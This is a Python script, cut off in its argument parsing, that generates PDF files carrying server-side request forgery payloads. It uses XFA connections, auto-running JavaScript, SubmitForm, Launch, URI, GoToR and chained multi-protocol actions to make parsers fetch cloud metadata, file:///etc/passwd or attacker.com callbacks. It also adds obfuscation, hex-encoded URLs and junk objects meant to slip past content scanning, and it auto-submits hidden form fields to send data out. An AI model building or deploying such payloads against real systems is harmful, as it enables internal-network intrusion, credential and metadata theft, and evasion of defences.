#!/usr/bin/env python3
"""
PDF SSRF Test File Generator (Enhanced Version)
Supports: XFA, JavaScript, FileSpec, SubmitForm, Launch, URI, ImportData, GoToR,
          Multi-Protocol, and combined payloads.
Features: FlateDecode compression, obfuscation, callback listener, batch generation.

Usage:
    python pdf_ssrf_gen.py --type xfa --url http://169.254.169.254/latest/meta-data/ -o xfa_test.pdf
    python pdf_ssrf_gen.py --type js --url http://internal.example.com/ -o js_test.pdf
    python pdf_ssrf_gen.py --type all --url http://callback.attacker.com/ --compress --obfuscate -o stealth.pdf
    python pdf_ssrf_gen.py --batch --url http://target/ --output-dir ./results/
    python pdf_ssrf_gen.py --type js --url http://YOUR_IP:8888/callback --listen 8888 --timeout 60 -o js.pdf
"""

import argparse
import sys
import os
import json
import zlib
import random
import string
import threading
import time
import logging
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ---------- Logging Setup ----------
logger = logging.getLogger('pdf_ssrf_gen')
handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('[%(levelname)s] %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)


# ---------- PDF String Escape ----------
def escape_pdf_string(s: str) -> str:
    """Escape backslashes and parentheses for a PDF literal string."""
    s = s.replace('\\', '\\\\')
    s = s.replace('(', '\\(')
    s = s.replace(')', '\\)')
    return s


def js_escape(s: str) -> str:
    """Escape backslashes and single quotes for a JavaScript string literal."""
    s = s.replace('\\', '\\\\')
    s = s.replace("'", "\\'")
    return s


def xml_escape(s: str) -> str:
    """Escape basic XML special characters."""
    s = s.replace('&', '&amp;')
    s = s.replace('<', '&lt;')
    s = s.replace('>', '&gt;')
    s = s.replace('"', '&quot;')
    s = s.replace("'", '&apos;')
    return s


def hex_encode_url_in_pdf(url: str) -> str:
    """Convert URL to PDF hex string format <hex>, bypassing string pattern matching."""
    hex_str = url.encode().hex().upper()
    return f'<{hex_str}>'


# ---------- Obfuscation Utilities ----------
def obfuscate_hex_stream(data: bytes) -> tuple:
    """Encode stream data as ASCIIHexDecode, bypassing simple content detection."""
    hex_encoded = data.hex().upper()
    result = ''
    for i, ch in enumerate(hex_encoded):
        result += ch
        if random.random() < 0.08:
            result += random.choice([' ', '\t', '\r\n'])
    result += '>'  # EOD marker
    return result.encode(), b'/Filter /ASCIIHexDecode'


def generate_junk_key(length: int = 8) -> str:
    """Generate a random PDF dictionary key."""
    return ''.join(random.choices(string.ascii_letters, k=length))


def generate_junk_value(length: int = 32) -> str:
    """Generate a random PDF string value."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


# ---------- Callback Server ----------
class CallbackHandler(BaseHTTPRequestHandler):
    """HTTP handler for SSRF callback verification."""
    triggered = False
    request_details = []

    def do_GET(self):
        CallbackHandler.triggered = True
        CallbackHandler.request_details.append({
            'method': 'GET',
            'path': self.path,
            'headers': dict(self.headers),
            'client': f'{self.client_address[0]}:{self.client_address[1]}',
            'timestamp': datetime.now().isoformat()
        })
        logger.info(f"[CALLBACK] GET {self.path} from {self.client_address[0]}:{self.client_address[1]}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'SSRF Callback Received')

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length) if content_length > 0 else b''
        CallbackHandler.triggered = True
        CallbackHandler.request_details.append({
            'method': 'POST',
            'path': self.path,
            'headers': dict(self.headers),
            'body': body.decode('utf-8', errors='replace'),
            'client': f'{self.client_address[0]}:{self.client_address[1]}',
            'timestamp': datetime.now().isoformat()
        })
        logger.info(f"[CALLBACK] POST {self.path} from {self.client_address[0]}:{self.client_address[1]}")
        if body:
            logger.info(f"[CALLBACK] Body: {body.decode('utf-8', errors='replace')[:200]}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'SSRF Callback Received')

    def log_message(self, format, *args):
        pass  # Suppress default HTTP log


def start_callback_server(port: int = 8888, timeout: int = 30):
    """Start a callback listener server to verify SSRF triggering."""
    CallbackHandler.triggered = False
    CallbackHandler.request_details = []

    server = HTTPServer(('0.0.0.0', port), CallbackHandler)
    server.timeout = 1  # 1 second poll interval

    def serve():
        start_time = time.time()
        logger.info(f"[LISTENER] Listening on 0.0.0.0:{port} (timeout: {timeout}s)...")
        while time.time() - start_time < timeout:
            server.handle_request()
            if CallbackHandler.triggered:
                logger.info("[LISTENER] SSRF callback received!")
                break
        if not CallbackHandler.triggered:
            logger.warning("[LISTENER] Timeout reached. No callback received.")
        server.server_close()

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()
    return server, thread


# ---------- PDF Builder ----------
class PDFBuilder:
    """Low-level PDF document builder with support for compression and obfuscation."""
    PLACEHOLDER_REF = 99999

    def __init__(self, compress: bool = False, obfuscate: bool = False, junk_count: int = 0, hex_url: bool = False):
        self.objects = {}          # obj_num -> (gen, content_bytes)
        self.next_num = 1
        self.catalog_num = None
        self.compress = compress
        self.obfuscate = obfuscate
        self.junk_count = junk_count
        self.hex_url = hex_url

    def add_object(self, content_bytes: bytes) -> int:
        """Add a PDF object and return its object number."""
        num = self.next_num
        self.next_num += 1
        self.objects[num] = (0, content_bytes)
        return num

    def reserve_object(self) -> int:
        """Reserve an object number for later use (solves circular references)."""
        num = self.next_num
        self.next_num += 1
        self.objects[num] = (0, b'<< >>')
        return num

    def add_stream_object(self, stream_data: bytes, dict_entries_bytes: bytes = b'') -> int:
        """Add a stream object, optionally compressed."""
        if self.compress:
            compressed_data = zlib.compress(stream_data)
            length = len(compressed_data)
            filter_entry = b'/Filter /FlateDecode '
            dict_part = b'<< ' + dict_entries_bytes + b' ' + filter_entry + b'/Length ' + str(length).encode() + b' >>'
            body = dict_part + b'\nstream\n' + compressed_data + b'\nendstream'
        elif self.obfuscate:
            hex_data, filter_bytes = obfuscate_hex_stream(stream_data)
            length = len(hex_data)
            dict_part = b'<< ' + dict_entries_bytes + b' ' + filter_bytes + b' /Length ' + str(length).encode() + b' >>'
            body = dict_part + b'\nstream\n' + hex_data + b'\nendstream'
        else:
            length = len(stream_data)
            dict_part = b'<< ' + dict_entries_bytes + b' /Length ' + str(length).encode() + b' >>'
            body = dict_part + b'\nstream\n' + stream_data + b'\nendstream'
        return self.add_object(body)

    def update_object(self, num: int, new_content_bytes: bytes):
        """Update an existing object's content."""
        if num in self.objects:
            gen, _ = self.objects[num]
            self.objects[num] = (gen, new_content_bytes)
        else:
            raise ValueError(f"Object {num} not found")

    def add_junk_objects(self):
        """Add junk/decoy objects to increase file complexity."""
        for _ in range(self.junk_count):
            junk_key = generate_junk_key()
            junk_val = generate_junk_value()
            junk_body = f'<< /{junk_key} ({junk_val}) /Type /Metadata >>'.encode()
            self.add_object(junk_body)

    def format_url(self, url: str) -> str:
        """Format URL for PDF embedding (hex or literal)."""
        if self.hex_url:
            return hex_encode_url_in_pdf(url)
        else:
            return f'({escape_pdf_string(url)})'

    def validate(self) -> list:
        """Perform basic structural validation."""
        errors = []
        if self.catalog_num is None:
            errors.append("No catalog object defined")
        elif self.catalog_num not in self.objects:
            errors.append(f"Catalog object {self.catalog_num} not found in objects")

        placeholder = str(self.PLACEHOLDER_REF).encode()
        for num, (gen, body) in self.objects.items():
            if placeholder in body:
                errors.append(f"Object {num} contains unresolved placeholder reference ({self.PLACEHOLDER_REF})")
        return errors

    def generate(self, filepath: str):
        """Serialize PDF to file."""
        # Add junk objects if requested
        if self.junk_count > 0:
            self.add_junk_objects()

        # Validate
        errors = self.validate()
        if errors:
            for e in errors:
                logger.warning(f"Validation: {e}")

        with open(filepath, 'wb') as f:
            # PDF header
            f.write(b'%PDF-1.7\n')
            f.write(b'%\xe2\xe3\xcf\xd3\n')  # binary comment

            offsets = {}
            sorted_nums = sorted(self.objects.keys())
            for num in sorted_nums:
                gen, body = self.objects[num]
                offset = f.tell()
                offsets[num] = offset
                f.write(f'{num} {gen} obj\n'.encode())
                f.write(body)
                f.write(b'\nendobj\n')

            # Cross-reference table
            xref_offset = f.tell()
            max_num = max(sorted_nums) if sorted_nums else 0
            f.write(b'xref\n')
            f.write(f'0 {max_num + 1}\n'.encode())
            f.write(b'0000000000 65535 f \n')
            for num in range(1, max_num + 1):
                if num in offsets:
                    off = offsets[num]
                    f.write(f'{off:010d} 00000 n \n'.encode())
                else:
                    f.write(b'0000000000 00000 f \n')

            # Trailer
            f.write(b'trailer\n')
            f.write(f'<< /Size {max_num + 1} /Root {self.catalog_num} 0 R >>\n'.encode())
            f.write(b'startxref\n')
            f.write(f'{xref_offset}\n'.encode())
            f.write(b'%%EOF\n')

        file_size = os.path.getsize(filepath)
        logger.info(f"Generated: {filepath} ({file_size} bytes)")


# ---------- Helper: Create basic page structure ----------
def create_page_structure(builder: PDFBuilder) -> tuple:
    """Create a minimal Page + Pages structure, returns (page_ref, pages_ref)."""
    page_ref = builder.reserve_object()
    pages_ref = builder.reserve_object()

    page_body = f'<< /Type /Page /Parent {pages_ref} 0 R /MediaBox [0 0 612 792] >>'.encode()
    builder.update_object(page_ref, page_body)

    pages_body = f'<< /Type /Pages /Kids [{page_ref} 0 R] /Count 1 >>'.encode()
    builder.update_object(pages_ref, pages_body)

    return page_ref, pages_ref


# ---------- PDF Type Builders ----------
def build_xfa(url: str, builder: PDFBuilder):
    """XFA connection SSRF — targets PDFBox, iText, Apache Tika."""
    escaped_url_xml = xml_escape(url)

    page_ref, pages_ref = create_page_structure(builder)

    # XFA stream
    xfa_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
    <subform name="form1">
      <pageSet>
        <pageArea>
          <contentArea x="0" y="0" w="612pt" h="792pt"/>
          <medium stock="default" short="612pt" long="792pt"/>
        </pageArea>
      </pageSet>
      <field name="ssrf_field">
        <ui><textEdit/></ui>
        <value><text>SSRF Test</text></value>
      </field>
    </subform>
    <data>
      <connection name="ssrf_conn" source="{escaped_url_xml}"/>
    </data>
  </template>
  <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
    <xfa:data>
      <form1><ssrf_field>test</ssrf_field></form1>
    </xfa:data>
  </xfa:datasets>
  <config xmlns="http://www.xfa.org/schema/xci/3.0/">
    <present><pdf><interactive>1</interactive></pdf></present>
  </config>
</xdp:xdp>'''
    xfa_stream_ref = builder.add_stream_object(xfa_xml.encode('utf-8'))

    # AcroForm
    acro_body = f'<< /XFA [{xfa_stream_ref} 0 R] >>'.encode()
    acro_ref = builder.add_object(acro_body)

    # Catalog
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /AcroForm {acro_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_js(url: str, builder: PDFBuilder):
    """JavaScript auto-execution SSRF — requires JS-enabled parser/viewer."""
    js_url = js_escape(url)

    page_ref, pages_ref = create_page_structure(builder)

    # Multiple JS techniques for broader coverage
    js_code = f'''
// Technique 1: app.launchURL
try {{ app.launchURL('{js_url}', false); }} catch(e) {{}}
// Technique 2: SOAP request
try {{
    var conn = Net.HTTP.request('{js_url}');
}} catch(e) {{}}
// Technique 3: submitForm
try {{
    this.submitForm('{js_url}');
}} catch(e) {{}}
// Technique 4: getURL
try {{
    app.getURL('{js_url}');
}} catch(e) {{}}
'''
    escaped_js = escape_pdf_string(js_code.strip())

    # JavaScript action
    action_body = f'<< /Type /Action /S /JavaScript /JS ({escaped_js}) >>'.encode()
    action_ref = builder.add_object(action_body)

    # Catalog with OpenAction
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_filespec(url: str, builder: PDFBuilder):
    """External image FileSpec SSRF — triggers when image is rendered."""
    url_ref = builder.format_url(url)

    page_ref = builder.reserve_object()
    pages_ref = builder.reserve_object()

    # Image XObject with /F pointing to URL
    img_dict = f'/Type /XObject /Subtype /Image /Width 1 /Height 1 /BitsPerComponent 8 /ColorSpace /DeviceRGB /F {url_ref}'.encode()
    img_ref = builder.add_stream_object(b'\xff\x00\x00', img_dict)

    # Content stream (draw the image)
    content_data = b'q 612 0 0 792 0 0 cm /Im0 Do Q'
    content_ref = builder.add_stream_object(content_data)

    # Pages
    pages_body = f'<< /Type /Pages /Kids [{page_ref} 0 R] /Count 1 >>'.encode()
    builder.update_object(pages_ref, pages_body)

    # Page with resources
    page_body = f'<< /Type /Page /Parent {pages_ref} 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im0 {img_ref} 0 R >> >> /Contents {content_ref} 0 R >>'.encode()
    builder.update_object(page_ref, page_body)

    # Catalog
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_submit(url: str, builder: PDFBuilder):
    """SubmitForm action SSRF — auto-submits form data to target URL."""
    url_ref = builder.format_url(url)

    page_ref = builder.reserve_object()
    pages_ref = builder.reserve_object()

    # Hidden form field with sensitive-looking data
    field_body = f'<< /Type /Annot /Subtype /Widget /FT /Tx /T (data) /V (ssrf_test_payload) /Rect [0 0 0 0] /F 6 /P {page_ref} 0 R >>'.encode()
    field_ref = builder.add_object(field_body)

    # Second field (simulates credential exfiltration)
    field2_body = f'<< /Type /Annot /Subtype /Widget /FT /Tx /T (token) /V (exfil_test_value) /Rect [0 0 0 0] /F 6 /P {page_ref} 0 R >>'.encode()
    field2_ref = builder.add_object(field2_body)

    # Pages
    pages_body = f'<< /Type /Pages /Kids [{page_ref} 0 R] /Count 1 >>'.encode()
    builder.update_object(pages_ref, pages_body)

    # Page with annotations
    page_body = f'<< /Type /Page /Parent {pages_ref} 0 R /MediaBox [0 0 612 792] /Annots [{field_ref} 0 R {field2_ref} 0 R] >>'.encode()
    builder.update_object(page_ref, page_body)

    # AcroForm
    acro_body = f'<< /Fields [{field_ref} 0 R {field2_ref} 0 R] >>'.encode()
    acro_ref = builder.add_object(acro_body)

    # SubmitForm action (flags: 0 = submit as FDF; 4 = submit as HTML form)
    action_body = f'<< /Type /Action /S /SubmitForm /F {url_ref} /Fields [{field_ref} 0 R {field2_ref} 0 R] /Flags 4 >>'.encode()
    action_ref = builder.add_object(action_body)

    # Catalog
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /AcroForm {acro_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_launch(url: str, builder: PDFBuilder):
    """Launch action SSRF — targets legacy Adobe Reader versions."""
    url_ref = builder.format_url(url)

    page_ref, pages_ref = create_page_structure(builder)

    # Launch action with /F (file specification)
    action_body = f'<< /Type /Action /S /Launch /F {url_ref} /NewWindow true >>'.encode()
    action_ref = builder.add_object(action_body)

    # Catalog with OpenAction
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_uri(url: str, builder: PDFBuilder):
    """URI action SSRF — widely supported across viewers."""
    url_ref = builder.format_url(url)

    page_ref, pages_ref = create_page_structure(builder)

    # URI action
    action_body = f'<< /Type /Action /S /URI /URI {url_ref} >>'.encode()
    action_ref = builder.add_object(action_body)

    # Also add as page annotation (link annotation covering entire page)
    link_annot_body = f'<< /Type /Annot /Subtype /Link /Rect [0 0 612 792] /A {action_ref} 0 R /Border [0 0 0] >>'.encode()
    link_ref = builder.add_object(link_annot_body)

    # Update page with annotation
    page_body = f'<< /Type /Page /Parent {pages_ref} 0 R /MediaBox [0 0 612 792] /Annots [{link_ref} 0 R] >>'.encode()
    builder.update_object(page_ref, page_body)

    # Catalog with OpenAction
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_importdata(url: str, builder: PDFBuilder):
    """ImportData action SSRF — FDF/XFDF import (targets iText, PDFBox)."""
    url_ref = builder.format_url(url)

    page_ref, pages_ref = create_page_structure(builder)

    # ImportData action
    action_body = f'<< /Type /Action /S /ImportData /F {url_ref} >>'.encode()
    action_ref = builder.add_object(action_body)

    # Catalog with OpenAction
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_gotor(url: str, builder: PDFBuilder):
    """GoToR action SSRF — remote PDF navigation (triggers file fetch)."""
    url_ref = builder.format_url(url)

    page_ref, pages_ref = create_page_structure(builder)

    # GoToR action
    action_body = f'<< /Type /Action /S /GoToR /F {url_ref} /D [0 /Fit] /NewWindow false >>'.encode()
    action_ref = builder.add_object(action_body)

    # Catalog with OpenAction
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_gotor_embedded(url: str, builder: PDFBuilder):
    """GoToE action SSRF — embedded file navigation (advanced vector)."""
    url_ref = builder.format_url(url)

    page_ref, pages_ref = create_page_structure(builder)

    # FileSpec object referencing the URL
    filespec_body = f'<< /Type /Filespec /F {url_ref} /UF {url_ref} >>'.encode()
    filespec_ref = builder.add_object(filespec_body)

    # GoToE action
    action_body = f'<< /Type /Action /S /GoToE /F {filespec_ref} 0 R /D [0 /Fit] /NewWindow false >>'.encode()
    action_ref = builder.add_object(action_body)

    # Catalog with OpenAction
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_rendition(url: str, builder: PDFBuilder):
    """Rendition action SSRF — multimedia content fetch."""
    url_ref = builder.format_url(url)

    page_ref, pages_ref = create_page_structure(builder)

    # Media clip object
    mediaclip_body = f'<< /Type /MediaClip /S /MCD /CT (video/mp4) /D {url_ref} >>'.encode()
    mediaclip_ref = builder.add_object(mediaclip_body)

    # Rendition object
    rendition_body = f'<< /Type /Rendition /S /MR /C {mediaclip_ref} 0 R >>'.encode()
    rendition_ref = builder.add_object(rendition_body)

    # Screen annotation (target for rendition)
    screen_body = f'<< /Type /Annot /Subtype /Screen /Rect [0 0 612 792] /P {page_ref} 0 R >>'.encode()
    screen_ref = builder.add_object(screen_body)

    # Rendition action
    action_body = f'<< /Type /Action /S /Rendition /R {rendition_ref} 0 R /AN {screen_ref} 0 R /OP 0 >>'.encode()
    action_ref = builder.add_object(action_body)

    # Update page with annotation
    page_body = f'<< /Type /Page /Parent {pages_ref} 0 R /MediaBox [0 0 612 792] /Annots [{screen_ref} 0 R] >>'.encode()
    builder.update_object(page_ref, page_body)

    # Catalog
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_aa(url: str, builder: PDFBuilder):
    """Additional Actions (AA) SSRF — multiple trigger points on page."""
    url_ref = builder.format_url(url)
    js_url = js_escape(url)

    page_ref = builder.reserve_object()
    pages_ref = builder.reserve_object()

    # JavaScript actions for different AA triggers
    js_open = f"try {{ app.launchURL('{js_url}', false); }} catch(e) {{}}"
    js_close = f"try {{ this.submitForm('{js_url}'); }} catch(e) {{}}"

    action_open_body = f'<< /Type /Action /S /JavaScript /JS ({escape_pdf_string(js_open)}) >>'.encode()
    action_open_ref = builder.add_object(action_open_body)

    action_close_body = f'<< /Type /Action /S /JavaScript /JS ({escape_pdf_string(js_close)}) >>'.encode()
    action_close_ref = builder.add_object(action_close_body)

    # URI action for page visible trigger
    uri_action_body = f'<< /Type /Action /S /URI /URI {url_ref} >>'.encode()
    uri_action_ref = builder.add_object(uri_action_body)

    # Pages
    pages_body = f'<< /Type /Pages /Kids [{page_ref} 0 R] /Count 1 >>'.encode()
    builder.update_object(pages_ref, pages_body)

    # Page with /AA (Additional Actions)
    page_body = f'<< /Type /Page /Parent {pages_ref} 0 R /MediaBox [0 0 612 792] /AA << /O {action_open_ref} 0 R /C {action_close_ref} 0 R /PV {uri_action_ref} 0 R >> >>'.encode()
    builder.update_object(page_ref, page_body)

    # Catalog with its own AA
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /AA << /WC {action_close_ref} 0 R /WS {action_open_ref} 0 R >> >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_multi_protocol(url: str, builder: PDFBuilder):
    """Multi-protocol probe SSRF — tests file://, gopher://, dict://, ftp://, http://."""
    # Extract host from user-provided URL for protocol variants
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or 80

    protocols = {
        'http': url,
        'https': url.replace('http://', 'https://') if url.startswith('http://') else url,
        'file_etc_passwd': 'file:///etc/passwd',
        'file_win': 'file:///c:/windows/win.ini',
        'gopher': f'gopher://{host}:{port}/_GET / HTTP/1.0%0d%0a%0d%0a',
        'dict': f'dict://{host}:{port}/INFO',
        'ftp': f'ftp://{host}:{port}/',
    }

    page_ref, pages_ref = create_page_structure(builder)

    # Create chained actions using /Next
    action_refs = []
    for proto_name, proto_url in protocols.items():
        proto_url_ref = builder.format_url(proto_url)
        action_body = f'<< /Type /Action /S /URI /URI {proto_url_ref} >>'.encode()
        ref = builder.add_object(action_body)
        action_refs.append((ref, proto_name, proto_url))

    # Chain actions: each action's /Next points to the next one
    for i in range(len(action_refs) - 1):
        ref, name, proto_url = action_refs[i]
        next_ref = action_refs[i + 1][0]
        proto_url_ref = builder.format_url(proto_url)
        chained_body = f'<< /Type /Action /S /URI /URI {proto_url_ref} /Next {next_ref} 0 R >>'.encode()
        builder.update_object(ref, chained_body)

    # First action is the entry point
    first_action_ref = action_refs[0][0]

    # Catalog
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /OpenAction {first_action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


def build_all(url: str, builder: PDFBuilder):
    """Combined payload — XFA + JavaScript + FileSpec + SubmitForm + URI in one PDF."""
    escaped_url_xml = xml_escape(url)
    js_url = js_escape(url)
    url_ref = builder.format_url(url)

    page_ref = builder.reserve_object()
    pages_ref = builder.reserve_object()

    # Image XObject with /F (FileSpec SSRF)
    img_dict = f'/Type /XObject /Subtype /Image /Width 1 /Height 1 /BitsPerComponent 8 /ColorSpace /DeviceRGB /F {url_ref}'.encode()
    img_ref = builder.add_stream_object(b'\xff\x00\x00', img_dict)

    # Content stream
    content_data = b'q 100 0 0 100 0 0 cm /Im0 Do Q'
    content_ref = builder.add_stream_object(content_data)

    # Hidden form field for SubmitForm
    field_body = f'<< /Type /Annot /Subtype /Widget /FT /Tx /T (exfil) /V (combined_test) /Rect [0 0 0 0] /F 6 /P {page_ref} 0 R >>'.encode()
    field_ref = builder.add_object(field_body)

    # Pages
    pages_body = f'<< /Type /Pages /Kids [{page_ref} 0 R] /Count 1 >>'.encode()
    builder.update_object(pages_ref, pages_body)

    # Page
    page_body = f'<< /Type /Page /Parent {pages_ref} 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im0 {img_ref} 0 R >> >> /Contents {content_ref} 0 R /Annots [{field_ref} 0 R] >>'.encode()
    builder.update_object(page_ref, page_body)

    # XFA stream
    xfa_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
    <subform name="form1">
      <pageSet><pageArea>
        <contentArea x="0" y="0" w="612pt" h="792pt"/>
        <medium stock="default" short="612pt" long="792pt"/>
      </pageArea></pageSet>
      <field name="data"><ui><textEdit/></ui></field>
    </subform>
    <data>
      <connection name="ssrf" source="{escaped_url_xml}"/>
    </data>
  </template>
  <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
    <xfa:data><form1><data/></form1></xfa:data>
  </xfa:datasets>
</xdp:xdp>'''
    xfa_stream_ref = builder.add_stream_object(xfa_xml.encode('utf-8'))

    # AcroForm (XFA + Fields)
    acro_body = f'<< /XFA [{xfa_stream_ref} 0 R] /Fields [{field_ref} 0 R] >>'.encode()
    acro_ref = builder.add_object(acro_body)

    # JavaScript action (multiple techniques)
    js_code = f'''
try {{ app.launchURL('{js_url}', false); }} catch(e) {{}}
try {{ this.submitForm('{js_url}'); }} catch(e) {{}}
'''
    escaped_js = escape_pdf_string(js_code.strip())
    js_action_body = f'<< /Type /Action /S /JavaScript /JS ({escaped_js}) >>'.encode()
    js_action_ref = builder.add_object(js_action_body)

    # SubmitForm action (chained via /Next from JS action)
    submit_action_body = f'<< /Type /Action /S /SubmitForm /F {url_ref} /Fields [{field_ref} 0 R] /Flags 4 >>'.encode()
    submit_action_ref = builder.add_object(submit_action_body)

    # URI action (chained from SubmitForm)
    uri_action_body = f'<< /Type /Action /S /URI /URI {url_ref} >>'.encode()
    uri_action_ref = builder.add_object(uri_action_body)

    # Chain: JS -> SubmitForm -> URI
    js_action_chained = f'<< /Type /Action /S /JavaScript /JS ({escaped_js}) /Next {submit_action_ref} 0 R >>'.encode()
    builder.update_object(js_action_ref, js_action_chained)

    submit_chained = f'<< /Type /Action /S /SubmitForm /F {url_ref} /Fields [{field_ref} 0 R] /Flags 4 /Next {uri_action_ref} 0 R >>'.encode()
    builder.update_object(submit_action_ref, submit_chained)

    # Catalog combines everything
    catalog_body = f'<< /Type /Catalog /Pages {pages_ref} 0 R /AcroForm {acro_ref} 0 R /OpenAction {js_action_ref} 0 R >>'.encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


# ---------- Build Function Registry ----------
BUILD_FUNCTIONS = {
    'xfa': build_xfa,
    'js': build_js,
    'filespec': build_filespec,
    'submit': build_submit,
    'launch': build_launch,
    'uri': build_uri,
    'importdata': build_importdata,
    'gotor': build_gotor,
    'gotoe': build_gotor_embedded,
    'rendition': build_rendition,
    'aa': build_aa,
    'multi': build_multi_protocol,
    'all': build_all,
}


# ---------- Batch Generation ----------
def batch_generate(url: str, output_dir: str, compress: bool = False, obfuscate: bool = False,
                   junk_count: int = 0, hex_url: bool = False):
    """Generate all payload types and produce a JSON report."""
    os.makedirs(output_dir, exist_ok=True)

    report = {
        'generated_at': datetime.now().isoformat(),
        'target_url': url,
        'options': {
            'compress': compress,
            'obfuscate': obfuscate,
            'junk_objects': junk_count,
            'hex_url': hex_url,
        },
        'files': []
    }

    for type_name, build_func in BUILD_FUNCTIONS.items():
        builder = PDFBuilder(compress=compress, obfuscate=obfuscate,
                             junk_count=junk_count, hex_url=hex_url)
        try:
            build_func(url, builder)
            filename = f'ssrf_{type_name}.pdf'
            filepath = os.path.join(output_dir, filename)
            builder.generate(filepath)
            file_size = os.path.getsize(filepath)
            report['files'].append({
                'type': type_name,
                'filename': filename,
                'size_bytes': file_size,
                'description': build_func.__doc__.strip() if build_func.__doc__ else '',
                'status': 'success'
            })
        except Exception as e:
            logger.error(f"Failed to generate {type_name}: {e}")
            report['files'].append({
                'type': type_name,
                'filename': None,
                'status': 'failed',
                'error': str(e)
            })

    # Save report
    report_path = os.path.join(output_dir, 'generation_report.json')
    with open(report_path, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    logger.info(f"Report saved to {report_path}")

    # Print summary
    success_count = sum(1 for f in report['files'] if f['status'] == 'success')
    total_count = len(report['files'])
    logger.info(f"Batch complete: {success_count}/{total_count} files generated successfully")

    return report


# ---------- URL Validation ----------
def validate_url(url: str) -> bool:
    """Basic URL validation."""
    if not url:
        return False
    valid_schemes = ['http://', 'https://', 'ftp://', 'file://', 'gopher://', 'dict://']
    return any(url.lower().startswith(scheme) for scheme in valid_schemes)


# ---------- Main ----------
def main():
    parser = argparse.ArgumentParser(
        description='PDF SSRF Test File Generator — Enhanced Version',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Payload Types:
  xfa         XFA connection source (PDFBox, iText, Tika)
  js          JavaScript auto-execution (app.launchURL, submitForm)
  filespec    External image file specification
  submit      SubmitForm action with form data exfiltration
  launch      Launch action (legacy Adobe Reader)
  uri         URI action (widely supported)
  importdata  ImportData action (FDF/XFDF import)
  gotor       GoToR remote PDF navigation
  gotoe       GoToE embedded file navigation
  rendition   Rendition multimedia fetch
  aa          Additional Actions (multiple triggers)
  multi       Multi-protocol probe (file, gopher, dict, ftp, http)
  all         Combined payload (XFA + JS + FileSpec + Submit + URI)

Examples:
  %(prog)s --type xfa --url http://169.254.169.254/latest/meta-data/ -o xfa.pdf
  %(prog)s --type all --url http://attacker.com/cb --compress --obfuscate --junk 20 -o stealth.pdf
  %(prog)s --batch --url http://target.internal/ --output-dir ./results/
  %(prog)s --type js --url http://YOUR_IP:8888/hit --listen 8888 --timeout 60 -o js.pdf
        """
    )
    parser.add_argument('--type', '-t',
                        choices=list(BUILD_FUNCTIONS.keys()),
                        help='SSRF payload type')
    parser.add_argument('--url', '-u', required=True,
                        help='Target URL (e.g. http://169.254.169.254/)')
    parser.add_argument('--output', '-o', default='ssrf_test.pdf',
                        help='Output PDF filename (default: ssrf_test.pdf)')
    parser.add_argument('--compress', '-c', action='store_true',
                        help='Enable FlateDecode compression on streams')
    parser.add_argument('--obfuscate', action='store_true',
